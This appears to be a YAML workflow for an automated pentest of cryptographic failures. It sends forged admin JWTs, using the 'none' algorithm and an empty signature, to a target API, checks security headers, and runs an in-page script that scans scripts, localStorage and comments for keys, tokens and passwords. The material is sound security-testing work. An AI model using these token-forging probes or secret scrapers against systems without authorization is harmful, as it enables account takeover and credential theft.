# Pentest: Secrets & Cryptography
# OWASP A02:2021 — Cryptographic Failures
id: pentest_secrets_crypto
name: Secrets & Cryptography Test
version: "1.0.0"
description: Hardcoded credentials, weak encryption, JWT bypass, data exposure

steps:
  - id: start
    module: flow.start
    label: Start
    params: {}
    orderIndex: 0

  - id: launch
    module: browser.launch
    label: Launch Browser
    params:
      stealth: true
      headless: true
    orderIndex: 1

  - id: jwt_probes
    module: http.batch
    label: JWT Validation Bypass
    params:
      requests:
        # None algorithm
        - method: GET
          url: "{{target_url}}/api/me"
          headers:
            Authorization: "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."
        # Empty signature
        - method: GET
          url: "{{target_url}}/api/me"
          headers:
            Authorization: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."
        # Expired token (should be rejected)
        - method: GET
          url: "{{target_url}}/api/me"
          headers:
            Authorization: "Bearer jwt-expired-probe.invalid.invalid"
        # Algorithm confusion (RS256 -> HS256)
        - method: GET
          url: "{{target_url}}/api/me"
          headers:
            Authorization: "Bearer jwt-alg-confusion-probe.invalid.invalid"
    orderIndex: 2

  - id: tls_check
    module: http.batch
    label: TLS & Transport Security
    params:
      requests:
        # Check HSTS + security headers on the target
        - method: GET
          url: "{{target_url}}/"
        # Same path, check response headers
        - method: GET
          url: "{{target_url}}/robots.txt"
      check_headers:
        - "Strict-Transport-Security"
        - "Content-Security-Policy"
        - "X-Content-Type-Options"
        - "X-Frame-Options"
    orderIndex: 3

  - id: sensitive_data
    module: browser.evaluate
    label: Client-Side Secret Scan
    params:
      script: |
        (function() {
          const results = { secrets: [], storage: {} };
          const patterns = [
            /(?:api[_-]?key|apikey)\s*[:=]\s*['"]([^'"]+)/gi,
            /(?:secret|token|password|auth)\s*[:=]\s*['"]([^'"]+)/gi,
            /(?:aws|gcp|azure)[_-](?:key|secret|token)\s*[:=]\s*['"]([^'"]+)/gi,
            /sk[-_](?:live|test)_[a-zA-Z0-9]{20,}/g,
            /ghp_[a-zA-Z0-9]{36}/g,
            /-----BEGIN (?:RSA )?PRIVATE KEY-----/g
          ];

          // Check inline scripts
          document.querySelectorAll('script:not([src])').forEach(s => {
            const code = s.textContent || '';
            for (const p of patterns) {
              const matches = code.match(p);
              if (matches) results.secrets.push(...matches.map(m => m.substring(0, 50)));
            }
          });

          // Check localStorage/sessionStorage
          try {
            for (let i = 0; i < localStorage.length; i++) {
              const key = localStorage.key(i);
              const val = localStorage.getItem(key) || '';
              if (/token|key|secret|password|auth/i.test(key)) {
                results.storage[key] = val.substring(0, 30) + '...';
              }
            }
          } catch(e) { /* localStorage access may throw in sandboxed contexts — skip storage probe */ }

          // Check HTML comments
          const comments = document.documentElement.innerHTML.match(/<!--[\s\S]*?-->/g) || [];
          results.html_comments = comments.filter(c =>
            /password|secret|key|token|todo|fixme|hack/i.test(c)
          ).length;

          return JSON.stringify(results, null, 2);
        })()
    orderIndex: 4

  - id: analyze
    module: llm.agent
    label: Analyze Results
    params:
      model: gpt-4o
      prompt: |
        Analyze secrets and cryptography test results.
        JWT bypass: ${jwt_probes.data}
        TLS/headers: ${tls_check.data}
        Client-side secrets: ${sensitive_data.data}
        Output JSON: { "findings": [...], "severity": "...", "summary": "..." }
    orderIndex: 5

edges:
  - { source: start, target: launch }
  - { source: launch, target: jwt_probes }
  - { source: jwt_probes, target: tls_check }
  - { source: tls_check, target: sensitive_data }
  - { source: sensitive_data, target: analyze }
